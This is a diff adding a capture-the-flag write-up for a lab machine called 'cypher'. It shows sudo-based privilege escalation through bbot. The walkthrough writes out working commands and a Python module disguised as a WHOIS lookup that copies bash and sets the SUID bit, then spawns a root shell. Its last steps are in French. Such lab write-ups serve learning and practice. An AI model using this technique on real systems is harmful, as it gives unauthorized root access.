@@ -229,4 +229,90 @@ bbot_preset.yml  user.txt
 graphasm@cypher:~$ cat user.txt 
 XXXXXXXXXXXXXXXXXXXXXXXXXXX
 
+Go find root.txt
+
+graphasm@cypher:/$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+
+graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /root/root.txt -d
+
+create a custom BBOT module that allows system commands to be executed
+
+let's do it :
+
+📌 1️⃣ Create a configuration file
+
+BBOT allows you to load custom modules from a YAML file that specifies where to look for the modules.
+
+Create the file /tmp/myconf.yml with:
+
+echo -e "module_dirs:\n - /tmp/modules" > /tmp/myconf.yml
+
+This file tells BBOT to look for modules in /tmp/modules.
+
+📌 2️⃣ Create the modules directory
+
+BBOT will look for modules in /tmp/modules, so create the folder:
+
+mkdir -p /tmp/modules
+
+📌 3️⃣ Create a Python module for BBOT
+
+BBOT runs Python modules, so we'll create a module that copies /bin/bash and makes it SUID root to obtain a root shell.
+
+Edit the file /tmp/modules/whois2.py:
+
+nano /tmp/modules/whois2.py
+
+And paste this code:
+
+from bbot.modules.base import BaseModule
+import os
+
+class whois2(BaseModule):
+
+watched_events = ["DNS_NAME"] # Monitors DNS events
+produced_events = ["WHOIS"] # Produces WHOIS events
+flags = ["passive", "safe"]
+meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
+options = {"api_key": ""} # API key option (not needed here)
+options_desc = {"api_key": "WhoisXMLAPI Key"}
+per_domain_only = True # Run only once per domain
+
+async def setup(self):
+# Exploit: copy bash to /tmp and enable SUID root
+os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
+
+async def handle_event(self, event):
+self.hugesuccess(f"Got {event} (event.data: {event.data})")
+
+💡 Hack explanation:
+
+cp /bin/bash /tmp/bash → Copies Bash to /tmp
+
+chmod u+s /tmp/bash → Enables the SUID bit, which means that bash will run with root permissions.
+
+📌 4️⃣ Run BBOT with the module
+
+Run this command:
+
+sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2
+
+If all goes well, you will have a SUID root bash in /tmp.
+
+📌 5️⃣ Obtenir un shell root
+
+Une fois le module exécuté, lance :
+
+/tmp/bash -p
+
+Le -p empêche bash d'abandonner ses privilèges root. 🎉
+
+and try cat /root/root.txt
+
 
